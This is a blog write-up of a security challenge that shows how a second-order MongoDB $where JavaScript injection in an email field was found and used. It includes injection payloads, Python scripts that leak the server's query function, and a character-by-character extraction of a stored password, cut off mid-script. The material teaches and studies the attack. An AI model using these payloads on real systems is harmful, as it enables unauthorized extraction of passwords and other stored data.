<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="en">
<head>
    <meta charset="utf-8">
<title>Intigriti 0123 Challenge Writeup - Second Order MongoDB JS Injection - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">



            
<link href="https://blog.huli.tw/2023/01/23/intigriti-0123-second-order-injection/" rel="alternate" hreflang="zh-TW" />
            
    




    
<link rel="canonical" href="https://blog.huli.tw/2023/01/23/en/intigriti-0123-second-order-injection/">
    





    <meta name="description" content="As usual, there is a Intigriti challenge in January, but this time it’s not an XSS challenge. It’s about “second order injection” which is relatively uncommon, so I decided to write a blog post.">
<meta property="og:type" content="article">
<meta property="og:title" content="Intigriti 0123 Challenge Writeup - Second Order MongoDB JS Injection">
<meta property="og:url" content="https://blog.huli.tw/2023/01/23/en/intigriti-0123-second-order-injection/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="As usual, there is a Intigriti challenge in January, but this time it’s not an XSS challenge. It’s about “second order injection” which is relatively uncommon, so I decided to write a blog post.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.huli.tw/img/intigriti-0123-second-order-injection/cover-en.png">
<meta property="article:published_time" content="2023-01-23T02:43:37.000Z">
<meta property="article:modified_time" content="2023-06-20T05:46:56.913Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/intigriti-0123-second-order-injection/cover-en.png">



<link rel="alternative" href="/atom.xml" title="Intigriti 0123 Challenge Writeup - Second Order MongoDB JS Injection" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=3.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/en">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/en/archives">Archive</a>
            
            <a class="navbar-item "
               href="/en/categories">Categories</a>
            
            <a class="navbar-item "
               href="/en/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    Table of Contents
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#the-challenge">1&nbsp;&nbsp;<b>The challenge</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#what-is-second-order-sql-injection">2&nbsp;&nbsp;<b>What is second order SQL injection?</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#keep-trying">3&nbsp;&nbsp;<b>Keep trying</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#binary-search-to-the-rescue">4&nbsp;&nbsp;<b>Binary search to the rescue</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#from-binary-search-to-ternary-search">5&nbsp;&nbsp;<b>From binary search to ternary search</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#a-faster-solution">6&nbsp;&nbsp;<b>A faster solution</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#can-we-make-it-less-than-100-requests">7&nbsp;&nbsp;<b>Can we make it less than 100 requests?</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#ultimate-version">8&nbsp;&nbsp;<b>Ultimate version</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
                
                <i class="fab fa-twitter"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-en.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
               <a class="navbar-item" href="/2023/01/23/intigriti-0123-second-order-injection/">中文</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            Intigriti 0123 Challenge Writeup - Second Order MongoDB JS Injection
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2023-01-23T02:43:37.000Z" itemprop="datePublished">23 January 2023</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/en/categories/Security/">Security</a>
        </span>
        
        
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <img src="/img/intigriti-0123-second-order-injection/cover-en.png" style="display:none" loading="lazy">

<p>As usual, there is a Intigriti challenge in January, but this time it’s not an XSS challenge. It’s about “second order injection” which is relatively uncommon, so I decided to write a blog post.</p>
<span id="more"></span>

<h2><span id="the-challenge">The challenge</span></h2><p><a target="_blank" rel="noopener" href="https://challenge-0123.intigriti.io/challenge.html">https://challenge-0123.intigriti.io/challenge.html</a></p>
<p><img src="/img/intigriti-0123-second-order-injection/p1.png" alt="index page"></p>
<p>There are only 3 simple features:</p>
<ol>
<li>register and login</li>
<li>change email</li>
<li>search user</li>
</ol>
<p>The goal is to find the flag, which is the password of one special user, the format is <code> INTIGRITI&#123;.*&#125;</code></p>
<p>At first, I have totally no idea what is this challenge about. I tried SQL injection to search user, but finds nothing.</p>
<p>Later on I found that we can use login page to create a new user(just like register), but that’s all, I still don’t know what to do.</p>
<p>Luckily, I saw two hints from the official twitter, the first one is about a fruit, the second one is about “SECOND”.</p>
<p>When I saw the word “SECOND”, I recalled a type of vulnerability called “second order SQL injection”.</p>
<h2><span id="what-is-second-order-sql-injection">What is second order SQL injection?</span></h2><p>Assumed there is a website, you can register and login, and the website escaped your input properly, so there is no SQL injection in both register and login feature.</p>
<p>But, after you logged in and visit home page, it calls somehting like this in backe-end:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'YOUR_USERNAME'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>They forgot to encode the username here, so here is vulnerable to SQL injection.</p>
<p>So, you can create a user with username <code>&#39; or &#39;1&#39;=&#39;1</code>, then visit home page, the following SQL query will be execute:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">''</span> <span class="token operator">or</span> <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>You input your SQL injection payload at one place, and got executed at another place, that is called second order SQL injection.</p>
<p>But, how to apply this technique to the challenge?</p>
<h2><span id="keep-trying">Keep trying</span></h2><p>At first, I tried to insert my SQL injection payload to the username, and then search this user to try to trigger it, but failed.</p>
<p>After a while, somehow I created two users(user01 and user02) with the same email, and when I searched user02, the result is user01.</p>
<p>It helps a lot. Becasue we know how the system works now.</p>
<p>When you search for a username, the system will get its email first, then use this email to search again. That is why when I searched for user02, the result is user01, because they shared the same email.</p>
<p>I tried a lot of payloads after knowing that the injection point is the email.</p>
<p>When you updating your email address, there is a validation in the back-end but it’s weak, anything starts with a valid email can bypass the check. For example, <code>abc@abc.com&#39; --</code> is also a valid email.</p>
<p>Following is a few payloads I have tried:</p>
<ol>
<li><code>abc@abc.com&#39; --</code></li>
<li><code>abc@abc.com&#39; #</code></li>
<li><code>abc@abc.com&#39; /*</code></li>
<li><code>abc@abc.com&#39; //</code></li>
<li><code>abc@abc.com&quot; --</code></li>
<li><code>abc@abc.com&quot; #</code></li>
<li><code>abc@abc.com&quot; /*</code></li>
<li><code>abc@abc.com&quot; //</code></li>
<li><code>abc@abc.com&#39; + &#39;1</code></li>
<li><code>abc@abc.com&quot; + &quot;1</code></li>
<li><code>abc@abc.com&quot; + version() + &quot;1</code></li>
</ol>
<p>I thought it’s SQL injection at first, but after trying for about an hour, I started to think it’s not.</p>
<p>Because the comment and the function seems not working, but somehow the string concatenation always works, so I am sure that it’s injectable.</p>
<p>I did a little experiment to make sure I am on the right track.</p>
<p>I created another user(user03) and update email to <code>abc@abc.com1</code>, then update user01’s email to <code>abc@abc.com&quot; + &quot;1</code>.</p>
<p>When search for user01, the result is user03, which means the injection is success.</p>
<p>Suddenly, an idea came to my mind: “maybe try JavaScript?”, so I tried <code>abc@abc.com&quot; + this + &quot;1</code>, no error.</p>
<p>Then, I tried <code>abc@abc.com&quot; + String.fromCharCode(49) + &quot;</code>, the result is still user03, bingo! (<code>ascii(&#39;1&#39;) = 49</code>)</p>
<p>Now, I know that it’s part of JavaScript, what to do next?</p>
<p>I tried to manually search what is available by using a boolean-based injection.</p>
<p>For example, <code>abc@abc.com&quot; + (require ? &quot;1&quot; : &quot;2&quot;) + &quot;</code>, if <code>require</code> is available, the user with email <code>abc@abc.com1</code> is returned(which is user03), otherwise it returns <code>null</code> because email <code>abc@abc.com2</code> is not exist.</p>
<p>I found that <code>arguments</code> is available, which means we are in a function, so I want to know what is the function body.</p>
<p>How do we get function body without knowing the function name? Some JavaScript magic! <code>arguments.callee.toString()</code> is the answer.</p>
<p>We can use the same way to leak the content, like <code>abc@abc.com&quot; + (arguments.callee.toString()[0] === &quot;a&quot; ? &quot;1&quot; : &quot;2&quot;) + &quot;</code> but it’s quite slow, there is a better way.</p>
<p>First, we create what I called <code>oracle account</code>, like the following:</p>
<ol>
<li>account_oracle_0 with email <a href="mailto:&#116;&#101;&#x73;&#x74;&#64;&#x6f;&#114;&#97;&#x63;&#x6c;&#101;&#x2e;&#99;&#x6f;&#109;&#x30;">&#116;&#101;&#x73;&#x74;&#64;&#x6f;&#114;&#97;&#x63;&#x6c;&#101;&#x2e;&#99;&#x6f;&#109;&#x30;</a></li>
<li>account_oracle_1 with email <a href="mailto:&#x74;&#x65;&#115;&#116;&#x40;&#x6f;&#x72;&#x61;&#x63;&#x6c;&#x65;&#x2e;&#x63;&#x6f;&#109;&#49;">&#x74;&#x65;&#115;&#116;&#x40;&#x6f;&#x72;&#x61;&#x63;&#x6c;&#x65;&#x2e;&#x63;&#x6f;&#109;&#49;</a></li>
<li>…</li>
<li>account_oracle_a with email <a href="mailto:&#116;&#101;&#115;&#116;&#64;&#x6f;&#x72;&#x61;&#99;&#x6c;&#x65;&#46;&#x63;&#x6f;&#109;&#x61;">&#116;&#101;&#115;&#116;&#64;&#x6f;&#x72;&#x61;&#99;&#x6c;&#x65;&#46;&#x63;&#x6f;&#109;&#x61;</a></li>
<li>account_oracle_z with email <a href="mailto:&#x74;&#101;&#x73;&#116;&#x40;&#111;&#x72;&#97;&#x63;&#x6c;&#x65;&#46;&#x63;&#x6f;&#109;&#x7a;">&#x74;&#101;&#x73;&#116;&#x40;&#111;&#x72;&#97;&#x63;&#x6c;&#x65;&#46;&#x63;&#x6f;&#109;&#x7a;</a></li>
</ol>
<p>Then, we create another account(say user_leak) with email <code>test@oracle.com&quot; + arguments.callee.toString()[0]+ &quot;</code></p>
<p>If the result of searching user_leak is <code>account_oracle_a</code>, then I know that the first character is <code>a</code>.</p>
<p>Here is the full exploit script to leak the function body:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> json
<span class="token keyword">import</span> concurrent<span class="token punctuation">.</span>futures
<span class="token keyword">import</span> string

BASE_URL <span class="token operator">=</span> <span class="token string">'https://challenge-0123.intigriti.io'</span>
LOGIN_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/login.html'</span>
EDIT_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/editor.html'</span>
QUERY_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/api/friends?q='</span>

SKIP_CREATE_ORACLE <span class="token operator">=</span> <span class="token number">0</span>
MAX_WORKERS <span class="token operator">=</span> <span class="token number">15</span>
charset <span class="token operator">=</span> string<span class="token punctuation">.</span>printable

<span class="token keyword">def</span> <span class="token function">create_oracle</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
  session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
  session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>LOGIN_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"account_oracle_"</span> <span class="token operator">+</span> c<span class="token punctuation">,</span>
    <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"account_oracle_"</span> <span class="token operator">+</span> c<span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>EDIT_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"email"</span><span class="token punctuation">:</span> <span class="token string">"test@oracle.com"</span> <span class="token operator">+</span> c
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_char</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
  payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'test@oracle.com" + (arguments.callee.toString()[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">]) +"'</span></span>
  session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>

  name <span class="token operator">=</span> <span class="token string">"account_get_"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>

  session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>LOGIN_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"username"</span><span class="token punctuation">:</span> name<span class="token punctuation">,</span>
    <span class="token string">"password"</span><span class="token punctuation">:</span> name
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>EDIT_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"email"</span><span class="token punctuation">:</span> payload
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

  resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>QUERY_URL <span class="token operator">+</span> name<span class="token punctuation">)</span>
  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'#'</span>

  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>text <span class="token operator">==</span> <span class="token string">'null'</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Failed'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'#'</span>

  data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
  char <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'account_oracle_'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> char

<span class="token keyword">if</span> SKIP_CREATE_ORACLE <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"create oracle account..."</span><span class="token punctuation">)</span>
  total <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>charset<span class="token punctuation">)</span>
  current <span class="token operator">=</span> <span class="token number">0</span>
  <span class="token keyword">with</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span>MAX_WORKERS<span class="token punctuation">)</span> <span class="token keyword">as</span> executor<span class="token punctuation">:</span>
      futures <span class="token operator">=</span> <span class="token punctuation">&#123;</span>executor<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>create_oracle<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span> c <span class="token keyword">for</span> c <span class="token keyword">in</span> charset<span class="token punctuation">&#125;</span>
      <span class="token keyword">for</span> future <span class="token keyword">in</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>as_completed<span class="token punctuation">(</span>futures<span class="token punctuation">)</span><span class="token punctuation">:</span>
          current <span class="token operator">+=</span> <span class="token number">1</span>
          <span class="token keyword">if</span> current <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">or</span> current <span class="token operator">==</span> total<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Progress: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>current<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>total<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leaking function body"</span><span class="token punctuation">)</span>
length <span class="token operator">=</span> <span class="token number">100</span>
ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">]</span> <span class="token operator">*</span> length
<span class="token keyword">with</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token keyword">as</span> executor<span class="token punctuation">:</span>
    futures <span class="token operator">=</span> <span class="token punctuation">&#123;</span>executor<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>leak_char<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> future <span class="token keyword">in</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>as_completed<span class="token punctuation">(</span>futures<span class="token punctuation">)</span><span class="token punctuation">:</span>
        index <span class="token operator">=</span> futures<span class="token punctuation">[</span>future<span class="token punctuation">]</span>
        data <span class="token operator">=</span> future<span class="token punctuation">.</span>result<span class="token punctuation">(</span><span class="token punctuation">)</span>
        ans<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> data
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The result is:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>email <span class="token operator">==</span> <span class="token string">"test@oracle.com"</span> <span class="token operator">+</span> <span class="token punctuation">(</span>arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">85</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">""</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>So, we can assumed that the code in the back-end is something like this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token string">'YOUR_EMAIL'</span>

db<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token literal-property property">$where</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">this.email === "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>payload<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"</span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">result</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>It’s not possible to do RCE here because the JS code is sandboxed by MongoDB.</p>
<p>We can also use the similar way to see what <code>this</code> have, just change the payload from <code>arguments.callee.toString()</code> to <code>Object.keys[this]</code>, the result is:</p>
<ol>
<li>id</li>
<li>username</li>
<li>password</li>
<li>friends</li>
<li>email</li>
</ol>
<p>After knowing all the information we need, we can start to leak the flag slowly with following payload:</p>
<pre class="line-numbers language-none"><code class="language-none">not@not_exist.ext&quot; || (this.password.startsWith(&quot;INTIGRITI&quot;) &amp;&amp; this.password[0] &#x3D;&#x3D;&#x3D; &quot;A&quot; ) &amp;&amp; &quot;&quot; &#x3D;&#x3D; &quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>It creates following function:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>email <span class="token operator">===</span> <span class="token string">"not@not_exist.ext"</span> <span class="token operator">||</span> 
  <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"INTIGRITI&#123;"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">"A"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
  <span class="token string">""</span> <span class="token operator">=</span> <span class="token string">""</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>When <code>this.password.startsWith(&quot;INTIGRITI&#123;&quot;) &amp;&amp; this.password[10] === &quot;A&quot;</code> is false, search result is <code>null</code> because nothing matched.</p>
<p>Otherwise, the user with matched pattern will be returned. </p>
<p>Here is the exploit script to leak the flag char by char:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> json
<span class="token keyword">import</span> concurrent<span class="token punctuation">.</span>futures
<span class="token keyword">import</span> string

BASE_URL <span class="token operator">=</span> <span class="token string">'https://challenge-0123.intigriti.io'</span>
LOGIN_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/login.html'</span>
EDIT_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/editor.html'</span>
QUERY_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/api/friends?q='</span>

SKIP_CREATE_ORACLE <span class="token operator">=</span> <span class="token number">0</span>
MAX_WORKERS <span class="token operator">=</span> <span class="token number">15</span>
charset <span class="token operator">=</span> string<span class="token punctuation">.</span>printable

<span class="token keyword">def</span> <span class="token function">leak_flag</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> char<span class="token punctuation">)</span><span class="token punctuation">:</span>
  session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
  payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'not@not_exist.ext" || (this.password.startsWith("INTIGRITI") &amp;&amp; this.password[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">] === "</span><span class="token interpolation"><span class="token punctuation">&#123;</span>char<span class="token punctuation">&#125;</span></span><span class="token string">" ) &amp;&amp; "" == "'</span></span>

  name <span class="token operator">=</span> <span class="token string">'account_flag_'</span>  <span class="token operator">+</span> char

  session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>LOGIN_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"username"</span><span class="token punctuation">:</span> name<span class="token punctuation">,</span>
